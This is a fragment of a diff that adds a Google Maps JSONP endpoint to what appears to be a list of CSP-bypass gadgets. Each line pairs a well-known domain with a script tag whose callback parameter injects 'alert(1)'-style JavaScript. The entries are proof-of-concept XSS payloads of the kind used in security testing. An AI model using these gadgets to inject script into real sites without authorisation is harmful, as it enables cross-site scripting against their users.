@@ -72,6 +72,7 @@ investor.coinbase.com	<script src="https://investor.coinbase.com/feed/People.svc
 itunes.apple.com	<script src="https://itunes.apple.com/se/rss/toppodcasts/json?callback=alert"></script>
 lptag.liveperson.net	<script src="https://lptag.liveperson.net/lptag/api/account/1/configuration/applications/taglets/.jsonp?v=2.0&cb=alert(1)-"></script>
 mango.buzzfeed.com	<script src="https://mango.buzzfeed.com/polls/service/editorial/post?poll_id=121996521&result_id=1&callback=alert(1)%2f%2f"></script>
+maps-api-ssl.google.com	<script src="https://maps-api-ssl.google.com/maps/api/js?callback=alert(1337)"></script>
 maps.google.com	<script src="https://maps.google.com/maps/api/js?sensor=false&callback=alert(1)"></script>
 maps.googleapis.com	<script src="https://maps.googleapis.com/maps/api/js?callback=alert(1337)"></script>
 mc.yandex.ru	<script src="https://mc.yandex.ru/watch/9528925/1?wmode=5&callback=alert"></script>
